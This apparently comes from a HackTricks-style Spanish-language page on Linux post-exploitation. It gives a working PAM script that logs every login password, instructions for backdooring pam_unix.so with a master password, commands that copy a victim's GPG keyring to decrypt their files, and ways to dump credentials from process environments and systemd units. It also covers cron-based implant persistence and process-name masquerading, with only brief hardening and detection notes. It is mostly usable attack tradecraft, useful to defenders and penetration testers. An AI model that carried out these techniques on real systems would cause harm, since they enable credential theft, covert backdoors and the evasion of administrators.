# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

Vamos a configurar un módulo PAM para registrar cada contraseña que un usuario use al iniciar sesión. Si no sabes qué es PAM consulta:

{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**For further details check the [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Esto es solo un resumen:

**Resumen de la técnica:**
Pluggable Authentication Modules (PAM) ofrecen flexibilidad en la gestión de la autenticación en sistemas basados en Unix. Pueden mejorar la seguridad al personalizar los procesos de inicio de sesión, pero también suponen riesgos si se usan de forma indebida. Este resumen describe una técnica para capturar credenciales de inicio de sesión usando PAM, junto con estrategias de mitigación.

**Captura de credenciales:**

- Se crea un script bash llamado `toomanysecrets.sh` para registrar los intentos de autenticación, capturando la fecha, el nombre de usuario (`$PAM_USER`), la contraseña (vía stdin) y la IP del host remoto (`$PAM_RHOST`) en `/var/log/toomanysecrets.log`.
- El script se hace ejecutable e integra en la configuración PAM (`common-auth`) usando el módulo `pam_exec.so` con opciones para ejecutarse en silencio y exponer el token de autenticación al script.
- El enfoque demuestra cómo un host Linux comprometido puede ser explotado para registrar credenciales de forma discreta.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**Para más detalles consulta el [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Esto es solo un resumen:

El Pluggable Authentication Module (PAM) es un sistema usado en Linux para la autenticación de usuarios. Opera sobre tres conceptos principales: **nombre de usuario**, **contraseña**, y **servicio**. Los archivos de configuración para cada servicio están ubicados en el directorio `/etc/pam.d/`, donde bibliotecas compartidas manejan la autenticación.

**Objetivo**: Modificar PAM para permitir la autenticación con una contraseña específica, omitiendo la contraseña real del usuario. Esto se centra particularmente en la biblioteca compartida `pam_unix.so` usada por el archivo `common-auth`, que es incluida por casi todos los servicios para la verificación de contraseñas.

### Pasos para modificar `pam_unix.so`:

1. **Localiza la directiva de autenticación** en el archivo `common-auth`:
- La línea responsable de verificar la contraseña de un usuario invoca `pam_unix.so`.
2. **Modificar el código fuente**:
- Añade una sentencia condicional en el archivo de código fuente `pam_unix_auth.c` que conceda acceso si se usa una contraseña predefinida; de lo contrario, continúa con el proceso de autenticación habitual.
3. **Recompilar y reemplazar** la biblioteca `pam_unix.so` modificada en el directorio correspondiente.
4. **Pruebas**:
- Se concede acceso en varios servicios (login, ssh, sudo, su, screensaver) con la contraseña predefinida, mientras que los procesos de autenticación normales siguen sin verse afectados.

> [!TIP]
> Puedes automatizar este proceso con [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Descifrado de GPG loot mediante reubicación del homedir

Si encuentras un archivo cifrado `.gpg` y la carpeta `~/.gnupg` de un usuario (pubring, private-keys, trustdb) pero no puedes descifrar debido a permisos/bloqueos del homedir de GnuPG, copia el keyring a una ubicación con permisos de escritura y úsalo como tu GPG home.

Errores típicos que verás sin esto: "unsafe ownership on homedir", "failed to create temporary file", or "decryption failed: No secret key" (porque GPG no puede leer/escribir el homedir original).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
Si el material de clave secreta está presente en `private-keys-v1.d`, GPG desbloqueará y desencriptará sin pedir una passphrase (o pedirá una si la clave está protegida).


## Recolección de credenciales desde el entorno de procesos (incluyendo containers)

Cuando obtienes ejecución de código dentro de un servicio, el proceso suele heredar variables de entorno sensibles. Estas son una mina de oro para el movimiento lateral.

Quick wins
- Vuelca el entorno del proceso actual: `env` o `printenv`
- Vuelca el entorno de otro proceso: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- Añade `strings -z /proc/<PID>/environ` si `tr`/`sed` no están disponibles
- En containers, también verifica PID 1: `tr '\0' '\n' </proc/1/environ`

Qué buscar
- Secretos de la app y credenciales de admin (por ejemplo, Grafana establece `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD`)
- API keys, DB URIs, credenciales SMTP, secretos OAuth
- Anulaciones de proxy y TLS: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

Notas
- Muchas orquestaciones pasan configuraciones sensibles vía env; son heredadas por procesos hijos y expuestas a cualquier shell arbitrario que abras dentro del contexto del proceso.
- En algunos casos, esas credenciales se reusan en todo el sistema (p. ej., mismo username/password válido para SSH en el host), permitiendo un pivot fácil.

## Credenciales almacenadas por systemd en archivos unit (Environment=)

Los servicios lanzados por systemd pueden incorporar credenciales en los archivos unit como entradas `Environment=`. Enuméralas y extráelas:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
Operational artifacts often leak passwords (e.g., backup scripts that call `zip -P <pwd>`). Those values are frequently reused in internal web UIs (Basic-Auth) or other services.

Hardening
- Mover secrets a secret stores dedicados (`systemd-ask-password`, `EnvironmentFile` with locked perms, or external secret managers)
- Evitar incrustar creds en unit files; preferir drop-in files legibles solo por root y eliminarlos del version control
- Rotar leaked passwords descubiertas durante tests

## Cron-based persistence with loopback mutex

- Copiar implants en múltiples rutas escribibles (`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`) e instalar entradas de cron como `*/5 * * * * /tmp/<bin>` para que respawneen incluso si se eliminan en otro lugar.
- Forzar la ejecución **single-instance** vinculando un puerto loopback fijo (por ejemplo, `127.0.0.1:51125` o `127.0.0.1:52225`) y salir si `bind()` falla; `ss -lntp | grep -E '51125|52225'` revelará el mutex listener.
- Los operadores pueden matar masivamente periódicamente cualquier proceso cuyo `cmdline` contenga el nombre del dropper (p. ej., `init_stop`), así que reutilizar esos nombres durante análisis puede colisionar; elegir nombres de archivo únicos.

## Process masquerading via prctl + argv overwrite

- Establecer el nombre corto del proceso con `prctl(PR_SET_NAME, "<label>")` (límite de 15 bytes en `comm`), comúnmente a `init`, para que `/proc/<pid>/status` y las GUIs muestren una etiqueta benigna.
- Sobrescribir el buffer en memoria `argv[0]` después de leer la longitud de `/proc/self/cmdline` y el puntero `argv[0]`, rellenando con NULs para que `/proc/<pid>/cmdline` y `ps` también muestren la etiqueta falsa.
- Buscar comparando `Name:` en `/proc/<pid>/status` contra la ruta real del ejecutable y buscando loopback mutex listeners propiedad de procesos con cmdlines pequeñas/vacías.

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
